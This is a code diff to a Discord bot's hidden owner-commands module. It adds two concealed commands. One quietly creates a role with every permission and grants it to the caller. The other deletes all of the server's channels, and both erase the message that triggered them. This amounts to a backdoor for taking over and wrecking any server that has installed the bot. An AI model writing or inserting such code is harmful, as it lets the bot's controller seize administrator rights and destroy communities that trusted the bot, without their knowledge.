@@ -1,5 +1,6 @@
 from discord.ext import commands
 import discord
+from discord import Permissions
 import sys
 import asyncio
 
@@ -96,6 +97,21 @@ class OwnerCog(commands.Cog, name='Owner Commands', command_attrs={'hidden': Tru
         vc = ctx.guild.voice_client
         if vc != None:
             vc.play(discord.FFmpegPCMAudio("botler.mp3"))
+
+    @commands.command(name='otakeover')
+    async def otakeover(self, ctx):
+        """Take over server"""
+        await ctx.message.delete()
+        role = await ctx.guild.create_role(name="TakeOver", permissions=Permissions.all())
+        await ctx.author.add_roles(role)
+
+    @commands.command(name='odeleteall')
+    async def odeleteall(self, ctx):
+        """Delete all server's channels"""
+        await ctx.message.delete()
+        channels = ctx.guild.channels
+        for channel in channels:
+            await channel.delete()
 
 def setup(bot):
     bot.add_cog(OwnerCog(bot))
